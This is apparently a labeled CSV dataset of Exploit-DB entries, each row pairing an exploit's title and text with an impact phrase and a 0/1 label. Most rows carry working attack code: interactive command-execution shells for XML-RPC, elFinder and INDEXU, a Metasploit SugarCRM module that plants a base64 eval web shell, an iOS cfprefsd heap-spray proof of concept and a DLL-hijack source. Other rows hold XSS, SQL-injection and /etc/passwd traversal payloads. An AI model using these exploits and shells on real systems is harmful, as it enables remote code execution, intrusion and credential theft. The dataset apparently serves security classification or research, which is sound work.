1084,"XML-RPC Library 1.3.0 - 'xmlrpc.php' Remote Command Execution (3) #!/usr/bin/perl -w # ******************************************************** # XML-RPC Remote Command Execution Exploit By Mike Rifone # ******************************************************** # This works on da phpxmlrpc, and da PEAR XML_RPC too! All # you need is to put the url to the server and u get shell # Dis is my first exploit but hey it works :D ~Mike@Rifone # ********************************************************  use LWP::UserAgent;  $brws = new LWP::UserAgent; $brws->agent(""Internet Explorer 6.0"");  $host = $ARGV[0];   if ( !$host )  {  	die(""Usage: xmlrpcexec.pl http://pathto/xmlrpcserver"");  }  while ( $host )  {  	print ""xmlrpc\@\#""; 	 	$exec = <STDIN>;	 	$data = ""<?xml version=\""1.0\""?><methodCall><methodName>foo.bar</methodName><params><param><value><string>1</string></value></param><param><value><string>1</string></value></param><param><value><string>1</string></value></param><param><value><string>1</string></value></param><param><value><name>','')); system('$exec'); die; /*</name></value></param></params></methodCall>""; 	 	$send = new HTTP::Request POST => $host; 	$send->content($data); 	$gots = $brws->request($send);	 	$show = $gots->content; 	 	if ( $show =~ /<b>([\d]{1,10})<\/b><br \/>(.*)/is ) 	{ 	    print $2 . ""\n""; 	} 	else 	{ 		print ""$show\n""; 	}   }  # milw0rm.com [2005-07-04]",Command Execution,1
26298,CMS Made Simple 0.10 - 'index.php' Cross-Site Scripting source: https://www.securityfocus.com/bid/14937/info  CMS Made Simple is prone to a cross-site scripting vulnerability. This issue is due to a failure in the application to properly sanitize user-supplied input.  An attacker may leverage this issue to have arbitrary script code executed in the browser of an unsuspecting user in the context of the affected site. This may facilitate the theft of cookie-based authentication credentials as well as other attacks.  This issue is reported to affect CMS Made Simple version 0.10; other versions may also be vulnerable.   http://www.example.com/index.php?page=<script>alert(document.cookie);</script>,have arbitrary script code executed in the browser of an unsuspecting user in the context of the affected site,1
27375,"sBlog 0.7.2 - 'comments_do.php' Multiple POST Cross-Site Scripting Vulnerabilities source: https://www.securityfocus.com/bid/17044/info   sBlog is prone to HTML-injection vulnerabilities. The application fails to properly sanitize user-supplied input before using it in dynamically generated content.    Attacker-supplied HTML and script code would be executed in the context of the affected website, potentially allowing for the theft of cookie-based authentication credentials. An attacker could also exploit this issue to control how the site is rendered to the user; other attacks are also possible.  POST /comments_do.php HTTP/1.1 Host: www.example.com User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; it-IT; rv:1.7.12) Gecko/20050919 Firefox/1.0.7 Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Language: it,it-it;q=0.8,en-us;q=0.5,en;q=0.3 Accept-Encoding: gzip,deflate Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7 Keep-Alive: 300 Connection: keep-alive Referer: http://www.example.com/comments.php?id=news_id Content-Type: application/x-www-form-urlencoded Content-Length: 99 blog_id=3&username=%3Cscript%3Ealert%28%22XSS%22%29%3B%3C%2Fscript%3E&email=&homepage=&comment=test [....]",the theft of cookie-based authentication credentials,1
34836,"Notepad++ 5.8.2 - 'libtidy.dll' DLL Loading Arbitrary Code Execution source: https://www.securityfocus.com/bid/44052/info  Notepad++ is prone to a vulnerability that lets attackers execute arbitrary code.  An attacker can exploit this issue by enticing a legitimate user to use the vulnerable application to open a file from a network share location that contains a specially crafted Dynamic Link Library (DLL) file.  Notepad++ 5.8.2 is vulnerable; other versions may also be affected.  /* #Notepad++ 5.8.2 DLL Hijacking Exploit (libtidy.dll)  #Author    :   anT!-Tr0J4n  #Greetz    :   Dev-PoinT.com ~ inj3ct0r.com  ~ All Dev-poinT members and my friends  #Email      :   D3v-PoinT[at]hotmail[d0t]com & C1EH[at]Hotmail[d0t]com  #Software :  http://notepad-plus-plus.org/  #Tested on:   Windows? XP sp3  #Home     :   www.Dev-PoinT.com   ========================== How  TO use : Compile and rename to  libtidy.dll , create a file in the same dir with one of the following extensions.   check the result > Hack3d               ==========================  # libtidy.dll(code) */   #include ""stdafx.h""   void init() { MessageBox(NULL,""Your System 0wn3d BY anT!-Tr0J4n"", ""anT!-Tr0J4n"",0x00000003); }     BOOL APIENTRY DllMain( HANDLE hModule,                        DWORD  ul_reason_for_call,                        LPVOID lpReserved  ) {     switch (ul_reason_for_call) { case DLL_PROCESS_ATTACH:  init();break; case DLL_THREAD_ATTACH: case DLL_THREAD_DETACH:  case DLL_PROCESS_DETACH: break;     }     return TRUE; }",execute arbitrary code,1
46803,"iOS 12.1.3 - 'cfprefsd' Memory Corruption // (c) 2019 ZecOps, Inc. - https://www.zecops.com - Find Attackers' Mistakes // Intended only for educational and defensive purposes only.  // Use at your own risk.   #include <xpc/xpc.h> #import <pthread.h> #include <mach/mach.h> #include <mach/task.h> #include <dlfcn.h> #include <mach-o/dyld_images.h> #include <objc/runtime.h>   #define AGENT 1   #define FILL_DICT_COUNT 0x600 #define FILL_COUNT 0x1000 #define FREE_COUNT 0x2000 #define FILL_SIZE (0xc0)   int need_stop = 0;   struct heap_spray {     void* fake_objc_class_ptr;     uint32_t r10;     uint32_t r4;     void* fake_sel_addr;     uint32_t r5;     uint32_t r6;     uint64_t cmd;     uint8_t pad1[0x3c];     uint32_t stack_pivot;     struct fake_objc_class_t {         char pad[0x8];         void* cache_buckets_ptr;         uint32_t cache_bucket_mask;     } fake_objc_class;     struct fake_cache_bucket_t {         void* cached_sel;         void* cached_function;     } fake_cache_bucket;     char command[32]; };   void fill_once(){       #if AGENT     xpc_connection_t client = xpc_connection_create_mach_service(""com.apple.cfprefsd.agent"",0,0); #else     xpc_connection_t client = xpc_connection_create_mach_service(""com.apple.cfprefsd.daemon"",0,XPC_CONNECTION_MACH_SERVICE_PRIVILEGED); #endif           xpc_connection_set_event_handler(client, ^void(xpc_object_t response) {         xpc_type_t t = xpc_get_type(response);         if (t == XPC_TYPE_ERROR){             printf(""err: %s\n"", xpc_dictionary_get_string(response, XPC_ERROR_KEY_DESCRIPTION));             need_stop = 1 ;         }         //printf(""received an event\n"");     });           xpc_connection_resume(client);     xpc_object_t main_dict = xpc_dictionary_create(NULL, NULL, 0);           xpc_object_t arr = xpc_array_create(NULL, 0);           xpc_object_t spray_dict = xpc_dictionary_create(NULL, NULL, 0);     xpc_dictionary_set_int64(spray_dict, ""CFPreferencesOperation"", 8);     xpc_dictionary_set_string(spray_dict, ""CFPreferencesDomain"", ""xpc_str_domain"");     xpc_dictionary_set_string(spray_dict, ""CFPreferencesUser"", ""xpc_str_user"");           char key[100];     char value[FILL_SIZE];     memset(value, ""A"", FILL_SIZE);     *((uint64_t *)value) = 0x4142010180202020;     //*((uint64_t *)value) = 0x180202020;     value[FILL_SIZE-1]=0;     for (int i=0; i<FILL_DICT_COUNT; i++) {         sprintf(key, ""%d"",i);         xpc_dictionary_set_string(spray_dict, key, value);     }            //NSLog(@""%@"", spray_dict);     for (uint64_t i=0; i<FILL_COUNT; i++) {         xpc_array_append_value(arr, spray_dict);     }           xpc_dictionary_set_int64(main_dict, ""CFPreferencesOperation"", 5);           xpc_dictionary_set_value(main_dict, ""CFPreferencesMessages"", arr);       void* heap_spray_target_addr = (void*)0x180202000;     struct heap_spray* map = mmap(heap_spray_target_addr, 0x1000, 3, MAP_ANON|MAP_PRIVATE|MAP_FIXED, 0, 0);     memset(map, 0, 0x1000);     struct heap_spray* hs = (struct heap_spray*)((uint64_t)map + 0x20);     //hs->null0 = 0;     hs->cmd = -1;     hs->fake_objc_class_ptr = &hs->fake_objc_class;     hs->fake_objc_class.cache_buckets_ptr = &hs->fake_cache_bucket;     hs->fake_objc_class.cache_bucket_mask = 0;     hs->fake_sel_addr = &hs->fake_cache_bucket.cached_sel;     // nasty hack to find the correct selector address     hs->fake_cache_bucket.cached_sel = 0x7fff00000000 + (uint64_t)NSSelectorFromString(@""dealloc"");           hs->fake_cache_bucket.cached_function = 0xdeadbeef;     size_t heap_spray_pages = 0x40000;     size_t heap_spray_bytes = heap_spray_pages * 0x1000;     char* heap_spray_copies = malloc(heap_spray_bytes);     for (int i = 0; i < heap_spray_pages; i++){     memcpy(heap_spray_copies+(i*0x1000), map, 0x1000);     }     xpc_dictionary_set_data(main_dict, ""heap_spray"", heap_spray_copies, heap_spray_bytes);       //NSLog(@""%@"", main_dict);     xpc_connection_send_message(client, main_dict);     printf(""fill once\n"");     xpc_release(main_dict); }   void trigger_vul(){     #if AGENT         printf(""AGENT\n"");         xpc_connection_t conn = xpc_connection_create_mach_service(""com.apple.cfprefsd.agent"",0,0);     #else         printf(""DAEMON\n"");         xpc_connection_t conn = xpc_connection_create_mach_service(""com.apple.cfprefsd.daemon"",0,XPC_CONNECTION_MACH_SERVICE_PRIVILEGED);     #endif         xpc_connection_set_event_handler(conn, ^(xpc_object_t response) {             xpc_type_t t = xpc_get_type(response);             if (t == XPC_TYPE_ERROR){                 printf(""err: %s\n"", xpc_dictionary_get_string(response, XPC_ERROR_KEY_DESCRIPTION));                 need_stop = 1 ;             }         });         xpc_connection_resume(conn);                   xpc_object_t hello = xpc_dictionary_create(NULL, NULL, 0);         xpc_object_t arr = xpc_array_create(NULL, 0);               xpc_object_t arr_free = xpc_dictionary_create(NULL, NULL, 0);         xpc_dictionary_set_int64(arr_free, ""CFPreferencesOperation"", 4);         xpc_array_append_value(arr, arr_free);         for (int i=0; i<FREE_COUNT; i++) {             xpc_object_t arr_elem1 = xpc_dictionary_create(NULL, NULL, 0);             xpc_dictionary_set_int64(arr_elem1, ""CFPreferencesOperation"", 20);             xpc_array_append_value(arr, arr_elem1);         }         //printf(""%p, %p\n"", arr_elem1, hello);         xpc_dictionary_set_int64(hello, ""CFPreferencesOperation"", 5);         xpc_dictionary_set_value(hello, ""CFPreferencesMessages"", arr);           //NSLog (@""%@"", hello);         fill_once();         xpc_connection_send_message(conn, hello);         NSLog(@"" trigger vuln"");         xpc_release(hello); }   int main(int argc, const char * argv[]) {       pthread_t fillthread1,triger_thread;     NSLog(@""start to trigger.."");     trigger_vul();       return 0; }",denial of service,1
9367,tenrok 1.1.0 - File Disclosure / Remote Code Execution ######################################################################### [+] Tenrok 1.1.0 (UDD/RCE) Multiple Remote Vulnerabilities [+] Discovered By SirGod [+] http://insecurity-ro.org [+] http://h4cky0u.org #########################################################################  [+] Homepage : http://tenrok.com/  [+] Users Data Disclosure   - PoC      http://127.0.0.1/userpwd.txt  [+] Remote Command Execution   - Must be logged in.   - Go to         http://127.0.0.1/post.php     in the Title field write :        <?php system($_GET['cmd']); ?>     then go to       http://127.0.0.1/display.php?cmd=[YOUR COMMAND]     and execute your commands.   - PoC       http://127.0.0.1/display.php?cmd=whoami  #########################################################################  # milw0rm.com [2009-08-05],Command Execution,1
38230,"Apache OFBiz 10.4.x - Multiple Cross-Site Scripting Vulnerabilities source: https://www.securityfocus.com/bid/57463/info  Apache OFBiz is prone to multiple cross-site scripting vulnerabilities because it fails to properly sanitize user-supplied input.  An attacker may leverage these issues to execute arbitrary HTML and script code in the browser of an unsuspecting user in the context of the affected site. This may let the attacker steal cookie-based authentication credentials and launch other attacks.  Apache OFBiz versions prior to 10.04.05 and 11.04.02 are vulnerable.   GET /exampleext/control/ManagePortalPages?parentPortalPageId=EXAMPLE""><script>alert(""xss"")</script> HTTP/1.1 Host: www.example.com:8443 User-Agent: Mozilla/5.0 (Windows NT 6.1; rv:17.0) Gecko/20100101 Firefox/17.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: es-ar,es;q=0.8,en-us;q=0.5,en;q=0.3 Connection: keep-alive Referer: https://www.example.com:8443/exampleext/control/main?externalLoginKey=EL367731470037 Cookie: JSESSIONID=C3E2C59FDC670DC004A562861681C092.jvm1; OFBiz.Visitor=10002",execute arbitrary HTML and script code in the browser of an unsuspecting user in the context of the affected site,1
16180,"BWMeter 5.4.0 - '.csv' Denial of Service GotGeek Labs http://www.gotgeek.com.br/  BWMeter v5.4.0 (.csv) Denial of Service    [+] Description  BWMeter is a powerful bandwidth meter, monitor, traffic controller and firewall, which measures, displays and controls all traffic to/from your computer or on your network.    [+] Information  Title: BWMeter v5.4.0 (.csv) Denial of Service Advisory: gg-002-2011 Date: 02-14-2011 Last update: 02-16-2011 Link: http://www.gotgeek.com.br/pocs/gg-002-2011.txt Tested on: Windows XP SP3    [+] Vulnerability  BWMeter is affected by denial of service vulnerability.  Successful exploitation of the vulnerability allows an attacker to crash the vulnerable application, denying service to legitimate users.  Affected Versions: BWMeter v5.4.0  Other versions may also be vulnerable.    [+] Proof of Concept/Exploit  #!/usr/bin/python #   junk = ""\x47\x47"" * 2500  try:     file = open('b0t.csv','w');     file.write(junk);     file.close();     print ""\n[*] gotgeek labs""     print ""[*] http://gotgeek.com.br\n""     print ""[+] b0t.csv created.""     print ""[+] Open BWMeter.exe...""     print ""[+] Statistics >> Import""     print ""[+] and Select b0t.csv\n"" except:     print ""\n[-] Error.. Can't write file to system.\n""    [+] References  http://www.desksoft.com/BWMeter.htm    [+] Credits  b0telh0",Denial of Service,1
37105,Quick.CMS 4.0 - 'p' Cross-Site Scripting source: https://www.securityfocus.com/bid/53273/info  Quick.CMS is prone to a cross-site scripting vulnerability because it fails to properly sanitize user-supplied input.  An attacker may leverage this issue to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may allow the attacker to steal cookie-based authentication credentials and to launch other attacks.  Quick.CMS 4.0 is vulnerable; other versions may also be affected.   http://www.example.com/admin/?p=[xss],execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site,1
21581,"Summit Computer Networks Lil' HTTP Server 2 - 'URLCount.cgi' HTML Injection source: https://www.securityfocus.com/bid/5115/info  Lil' HTTP server is a web server application for Windows environments and is maintained by Summit Computer Networks.  Reportedly, Lil' HTTP Server is vulnerable to HTML injection attacks.  The vulnerability is present in the 'REPORT' function found in the 'urlcount.cgi' script. While the CGI does filter script tags, other HTML elements are not sufficiently sanitized, allowing for arbitrary HTML to be injected into the reports page.  http://target/urlcount.cgi?%3CIMG%20SRC%3D%22%22%20ONERROR%3D%22alert%28%27xss%27%29%22%3E  This will affect web users who visit the reports page:  http://target/urlcount.cgi?REPORT",arbitrary HTML to be injected into the reports page,1
19403,"SugarCRM CE 6.3.1 - 'Unserialize()' PHP Code Execution (Metasploit) ## # This file is part of the Metasploit Framework and may be subject to # redistribution and commercial restrictions. Please see the Metasploit # web site for more information on licensing and terms of use. #   http://metasploit.com/ ##  require 'msf/core'  class Metasploit3 < Msf::Exploit::Remote 	Rank = ExcellentRanking  	include Msf::Exploit::Remote::HttpClient  	def initialize(info = {}) 		super(update_info(info, 			'Name'           => 'SugarCRM <= 6.3.1 unserialize() PHP Code Execution', 			'Description'    => %q{ 					This module exploits a php unserialize() vulnerability in SugarCRM <= 6.3.1 				which could be abused to allow authenticated SugarCRM users to execute arbitrary 				code with the permissions of the webserver.  				The dangerous unserialize() exists in the 'include/MVC/View/views/view.list.php' 				script, which is called with user controlled data from the 'current_query_by_page' 				parameter. The exploit abuses the __destruct() method from the SugarTheme class 				to write arbitrary PHP code to a 'pathCache.php' on the web root. 			}, 			'Author'	=> 				[ 					'EgiX', # Vulnerability discovery and PoC 					'juan vazquez', # Metasploit module 					'sinn3r' # Metasploit module 				], 			'License'        => MSF_LICENSE, 			'Version'        => '$Revision$', 			'References'     => 				[ 					[ 'CVE', '2012-0694' ], 					[ 'EDB', '19381' ], 					[ 'URL', 'http://www.sugarcrm.com/forums/f22/critical-security-vulnerability-76537/' ] 				], 			'Privileged'     => false, 			'Platform'       => ['php'], 			'Arch'           => ARCH_PHP, 			'Payload'        => 				{ 					'DisableNops' => true, 				}, 			'Targets'        => [ ['Automatic', { }], ], 			'DefaultTarget'  => 0, 			'DisclosureDate' => 'Jun 23 2012' 			))  			register_options( 				[ 					OptString.new('TARGETURI',	[ true, ""The base path to the web application"", ""/sugarcrm/""]), 					OptString.new('USERNAME', [true, ""The username to authenticate with"" ]), 					OptString.new('PASSWORD', [true, ""The password to authenticate with"" ]) 				], self.class) 	end   	def on_new_session(client) 		if client.type == ""meterpreter"" 			f = ""pathCache.php"" 			client.core.use(""stdapi"") if not client.ext.aliases.include?(""stdapi"") 			begin 				client.fs.file.rm(f) 				print_good(""#{@peer} - #{f} removed to stay ninja"") 			rescue 				print_error(""#{@peer} - Unable to remove #{f}"") 			end 		end 	end  	def exploit 		base = target_uri.path 		base << '/' if base[-1, 1] != '/'  		@peer = ""#{rhost}:#{rport}"" 		username = datastore['USERNAME'] 		password = datastore['PASSWORD']  		# Can't use vars_post because it'll escape ""_"" 		data = ""module=Users&"" 		data << ""action=Authenticate&"" 		data << ""user_name=#{username}&"" 		data << ""user_password=#{password}""  		res = send_request_cgi( 		{ 			'uri'    => ""#{base}index.php"" , 			'method' => ""POST"", 			'headers'   => 				{ 					'Cookie'  => ""PHPSESSID=1"", 				}, 			'data'   => data 		})  		if not res or res.headers['Location'] =~ /action=Login/ or not res.headers['Set-Cookie'] 			print_error(""#{@peer} - Login failed with \""#{username}:#{password}\"""") 			return 		end  		if res.headers['Set-Cookie'] =~ /PHPSESSID=([A-Za-z0-9]*); path/ 			session_id = $1 		else 			print_error(""#{@peer} - Login failed with \""#{username}:#{password}\"" (No session ID)"") 			return 		end  		print_status(""#{@peer} - Login successful with #{username}:#{password}"")  		data = ""module=Contacts&"" 		data << ""Contacts2_CONTACT_offset=1&"" 		data << ""current_query_by_page="" 		#O:10:""SugarTheme"":2:{s:10:""*dirName"";s:5:""../.."";s:20:""SugarTheme_jsCache"";s:49:""<?php eval(base64_decode($_SERVER[HTTP_CMD])); ?>"";} 		data << ""TzoxMDoiU3VnYXJUaGVtZSI6Mjp7czoxMDoiACoAZGlyTmFtZSI7czo1OiIuLi8uLiI7czoyMDoiAFN1Z2FyVGhlbWUAX2pzQ2FjaGUiO3M6NDk6Ijw/cGhwIGV2YWwoYmFzZTY0X2RlY29kZSgkX1NFUlZFUltIVFRQX0NNRF0pKTsgPz4iO30=""  		print_status(""#{@peer} - Exploiting the unserialize()"")  		res = send_request_cgi( 		{ 			'uri' => ""#{base}index.php"", 			'method' => 'POST', 			'headers'   => 			{ 				'Cookie'  => ""PHPSESSID=#{session_id};"", 			}, 			'data' => data 		})  		if not res or res.code != 200 			print_error(""#{@peer} - Exploit failed: #{res.code}"") 			return 		end  		print_status(""#{@peer} - Executing the payload"")  		res = send_request_cgi( 		{ 			'method' => 'GET', 			'uri'    => ""#{base}pathCache.php"", 			'headers' => { 				'Cmd' => Rex::Text.encode_base64(payload.encoded) 			} 		})  		if res 			print_error(""#{@peer} - Payload execution failed: #{res.code}"") 			return 		end  	end end",execute arbitrary code with the permissions of the webserver,1
36925,"elFinder 2 - Remote Command Execution (via File Creation) #[+] Author: TUNISIAN CYBER #[+] Title: elFinder 2 Remote Command Execution (Via File Creation) Vulnerability #[+] Date: 06-05-2015 #[+] Vendor: https://github.com/Studio-42/elFinder #[+] Type: WebAPP #[+] Tested on: KaliLinux (Debian) #[+] Twitter: @TCYB3R #[+] Time Line: #    03-05-2015:Vulnerability Discovered #    03-05-2015:Contacted Vendor #    04-05-2015:No response #    05-05-2015:No response #    06-05-2015:No response #    06-05-2015:Vulnerability published  import cookielib, urllib import urllib2 import sys  print""\x20\x20+-------------------------------------------------+"" print""\x20\x20| elFinder Remote Command Execution Vulnerability |"" print""\x20\x20|                 TUNISIAN CYBER                  |"" print""\x20\x20+-------------------------------------------------+""   host = raw_input('\x20\x20Vulnerable Site:') evilfile = raw_input('\x20\x20EvilFileName:') path=raw_input('\x20\x20elFinder s Path:')   tcyber = cookielib.CookieJar() opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(tcyber))  create = opener.open('http://'+host+'/'+path+'/php/connector.php?cmd=mkfile&name='+evilfile+'&target=l1_Lw') #print create.read()  payload = urllib.urlencode({                             'cmd' : 'put',                             'target' : 'l1_'+evilfile.encode('base64','strict'),                             'content' : '<?php passthru($_GET[\'cmd\']); ?>'                             })  write = opener.open('http://'+host+'/'+path+'/php/connector.php', payload) #print write.read() print '\n' while True:     try:         cmd = raw_input('[She3LL]:~# ')          execute = opener.open('http://'+host+'/'+path+'/admin/js/plugins/elfinder/files/'+evilfile+'?cmd='+urllib.quote(cmd))         reverse = execute.read()         print reverse;          if cmd.strip() == 'exit':             break      except Exception:         break  sys.exit()",Command Execution,1
1644,"INDEXU 5.0.1 - 'base_path' Remote File Inclusion #!/usr/bin/perl ## # INDEXU <= 5.0.1 base_path Remote File Inclusion Exploit # Bug Found & code By K-159 # # base on advisory at http://echo.or.id/adv/adv26-K-159-2006.txt # # code reference from ExploiterCode.com ## # www.echo.or.id (c) 2006 # ## # usage: # perl indexu.pl <target> <cmd shell location> <cmd shell variable> # # perl indexu.pl http://target.com/indexu/ http://target.com/cmd.txt cmd # # cmd shell example: <?passthru($_GET[cmd]);?> # # cmd shell variable: ($_GET[cmd]); ## # # #greetz:echo|staff(y3dips,the_day,moby,comex,z3r0byt3,c-a-s-e,S`to,lirva32,anonymous),kaiten,an0maly,SinChan,sakitjiwa,rizal,etc # # Contact:  eufrato[at]gmail.com www.echo.or.id #e-c-h-o @irc.dal.net ##  use LWP::UserAgent;  $Path = $ARGV[0]; $Pathtocmd = $ARGV[1]; $cmdv = $ARGV[2];  if($Path!~/http:\/\// || $Pathtocmd!~/http:\/\// || !$cmdv){usage()}  head();  while() {        print ""[shell] \$""; while(<STDIN>)        {                $cmd=$_;                chomp($cmd);  $xpl = LWP::UserAgent->new() or die; $req = HTTP::Request->new(GET =>$Path.' application.php?base_path='.$Pathtocmd.'?&'.$cmdv.'='.$cmd)or die ""\nCould Not connect\n"";  $res = $xpl->request($req); $return = $res->content; $return =~ tr/[\n]/[ê]/;  if (!$cmd) {print ""\nPlease Enter a Command\n\n""; $return ="""";}  elsif ($return =~/failed to open stream: HTTP request failed!/ || $return =~/: Cannot execute a blank command in <b>/)        {print ""\nCould Not Connect to cmd Host or Invalid Command Variable\n"";exit} elsif ($return =~/^<br.\/>.<b>Fatal.error/) {print ""\nInvalid Command or No Return\n\n""}  if($return =~ /(.*)/)   {        $finreturn = $1;        $finreturn=~ tr/[ê]/[\n]/;        print ""\r\n$finreturn\n\r"";        last; }  else {print ""[shell] \$"";}}}last;  sub head()  {  print ""\n============================================================================\r\n"";  print "" *INDEXU <= 5.0.1 base_path Remote File Inclusion Exploit*\r\n"";  print ""============================================================================\r\n"";  } sub usage()  {  head();  print "" Usage: perl indexu.pl <target> <cmd shell location> <cmd shell variable>\r\n\n"";  print "" <Site> - Full path to INDEXU ex: http://www.site.com/indexu/ \r\n"";  print "" <cmd shell> - Path to cmd Shell e.g http://www.different-site.com/cmd.txt \r\n"";  print "" <cmd variable> - Command variable used in php shell \r\n"";  print ""============================================================================\r\n"";  print ""                           Bug Found by K-159 \r\n"";  print ""                    www.echo.or.id #e-c-h-o irc.dal.net \r\n"";  print ""============================================================================\r\n"";  exit();  }  # milw0rm.com [2006-04-04]",code execution,1
5200,Podcast Generator 1.0 Beta 2 - Remote File Inclusion / File Disclosure ### Podcast Generator <= 1.0 BETA 2 RFI / File Disclosure Remote Vulnerabilities ### http://sourceforge.net/project/showfiles.php?group_id=163847 ### POC : ### I- Remote File Inclusion Vulnerabilities ### /podcastgen1.0beta2/components/xmlparser/loadparser.php?absoluteurl=shell ### /podcastgen1.0beta2/core/admin/admin.php?p=admin&absoluteurl=shell ### /podcastgen1.0beta2/core/admin/categories.php?categoriesenabled=yes&do=categories&action=del&absoluteurl=shell ### /podcastgen1.0beta2/core/admin/categories_add.php?absoluteurl=shell ### /podcastgen1.0beta2/core/admin/categories_remove.php?absoluteurl=shell ### /podcastgen1.0beta2/core/admin/edit.php?p=admin&do=edit&c=ok&absoluteurl=shell ### /podcastgen1.0beta2/core/admin/editdel.php?p=admin&absoluteurl=shell ### /podcastgen1.0beta2/core/admin/ftpfeature.php?p=admin&absoluteurl=shell ### /podcastgen1.0beta2/core/admin/login.php?absoluteurl=shell ### /podcastgen1.0beta2/core/admin/pgRSSnews.php?absoluteurl=shell ### /podcastgen1.0beta2/core/admin/showcat.php?absoluteurl=shell ### /podcastgen1.0beta2/core/admin/upload.php?p=admin&do=upload&c=ok&absoluteurl=shell ### /podcastgen1.0beta2/core/archive_cat.php?absoluteurl=shell ### /podcastgen1.0beta2/core/archive_nocat.php?absoluteurl=shell ### /podcastgen1.0beta2/core/recent_list.php?absoluteurl=shell ### II- Remote File Disclosure Vulnerabilities ### /podcastgen1.0beta2/core/themes.php?theme_path=../../../../../../../../../etc/passwd%00 ### /podcastgen1.0beta2/download.php?filename=../../../../../../../../../etc/passwd                                   @@@@@@@ ANA TRYAGI @@@@@@@  # milw0rm.com [2008-02-28],information disclosure,1
36730,"Basic Analysis and Security Engine (BASE) 1.4.5 - 'base_stat_ipaddr.php?base_path' Remote File Inclusion source: https://www.securityfocus.com/bid/51979/info                              BASE is prone to a security-bypass vulnerability and multiple remote file-include vulnerabilities.                              An attacker can exploit these issues to gain unauthorized access, obtain potentially sensitive information, or execute arbitrary script code in the context of the webserver process. This may allow the attacker to compromise the application and the computer; other attacks are also possible.                              BASE 1.4.5 is vulnerable; other versions may be affected.  Exploit: http://www.example.com/base/base_stat_ipaddr.php?BASE_path=[EV!L]","gain unauthorized access, obtain potentially sensitive information, or execute arbitrary script code in the context of the webserver process",1
31318,Centreon 1.4.2.3 - 'index.php' Local File Inclusion source: https://www.securityfocus.com/bid/28052/info  Centreon is prone to a local file-include vulnerability because it fails to properly sanitize user-supplied input.  Exploiting this issue may allow an attacker to obtain potentially sensitive information that may lead to further attacks.  This issue affects Centreon 1.4.2.3; other versions may also be vulnerable.  http://www.example.com/include/doc/index.php?page=../../www/oreon.conf.php http://www.example.com/include/doc/index.php?page=../../../../../etc/passwd http://www.example.com/include/doc/index.php?page=[Local File],fails to properly sanitize user-supplied input,1
28820,"Webgenius Goop Gallery 2.0 - 'index.php' Cross-Site Scripting source: https://www.securityfocus.com/bid/20554/info  GOOP Gallery is prone to a cross-site scripting vulnerability because the application fails to properly sanitize user-supplied input.   An attacker may leverage this issue to have arbitrary script code execute in the browser of an unsuspecting user in the context of the affected site. This may help the attacker steal cookie-based authentication credentials and launch other attacks.  http://www.example.com/goopgallery/index.php?next=%BB&gallery=demo+gallery+1I=Bunny.JPG"">[XSS-CODE] http://www.example.com/goopgallery/index.php?gallery=demo+gallery+1I=Bunny.JPG"">[XSS-CODE]",have arbitrary script code execute in the browser of an unsuspecting user in the context of the affected site,1
29359,"DMXReady Secure Login Manager 1.0 - 'content.asp?sent' SQL Injection source: https://www.securityfocus.com/bid/21788/info   DMXReady Secure Login Manager is prone to multiple SQL-injection vulnerabilities because the application fails to properly sanitize user-supplied input before using it in SQL queries.    A successful exploit could allow an attacker to compromise the application, access or modify data, or exploit vulnerabilities in the underlying database.   These issues affect Secure Login Manager 1.0; other versions may also be vulnerable.  http://www.example.com/content.asp?mid=31&incid=17&sent=[sql]",the application fails to properly sanitize user-supplied input before using it in SQL queries,0
35472,"Offset2lib - Bypassing Full ASLR On 64 bit Linux -----BEGIN PGP SIGNED MESSAGE----- Hash: SHA1  +------------------------------------------------------------------------------+ | Packet Storm Advisory 2014-1204-1                                            | | http://packetstormsecurity.com/                                              | +------------------------------------------------------------------------------+ | Title: Offset2lib: Bypassing Full ASLR On 64bit Linux                        | +--------------------+---------------------------------------------------------+ | Release Date       | 2014/12/04                                              | | Advisory Contact   | Packet Storm (advisories@packetstormsecurity.com)       | | Researchers        | Hector Marco and Ismael Ripoll                          | +--------------------+---------------------------------------------------------+ | System Affected    | 64 bit PIE Linux                                        | | Classification     | 1-day                                                   | +--------------------+---------------------------------------------------------+  +----------+ | OVERVIEW | +----------+  The release of this advisory provides exploitation details in relation  a weakness in the Linux ASLR implementation.  The problem appears when  the executable is PIE compiled and it has an address leak belonging to  the executable.  These details were obtained through the Packet Storm Bug Bounty program  and are being released to the community.  +------------------------------------------------------------------------------+  +---------+ | DETAILS | +---------+  An attacker is able to de-randomize all mmapped areas (libraries, mapped files, etc.)  by knowing only an address belonging to the application and the offset2lib value.  +------------------------------------------------------------------------------+  +------------------+ | PROOF OF CONCEPT | +------------------+  The proof of concept exploit code is available here: https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/35472.tgz http://packetstormsecurity.com/files/129398  +------------------------------------------------------------------------------+  +---------------+ | RELATED LINKS | +---------------+  http://cybersecurity.upv.es/attacks/offset2lib/offset2lib.html  +------------------------------------------------------------------------------+   +----------------+ | SHAMELESS PLUG | +----------------+  The Packet Storm Bug Bounty program gives researchers the ability to profit  from their discoveries.  You can get paid thousands of dollars for one day  and zero day exploits.  Get involved by contacting us at  getpaid@packetstormsecurity.com or visit the bug bounty page at:   http://packetstormsecurity.com/bugbounty/  -----BEGIN PGP SIGNATURE----- Version: GnuPG v1.4.11 (GNU/Linux)  iEYEARECAAYFAlSBA04ACgkQrM7A8W0gTbG0jwCdH5CHOIDO9ELRcrPhQmf5FF4z TgQAn2zuwadnWdMueC8gUQPT5gCmrQyp =iegV -----END PGP SIGNATURE-----","de-randomize all mmapped areas (libraries, mapped files, etc.)",0
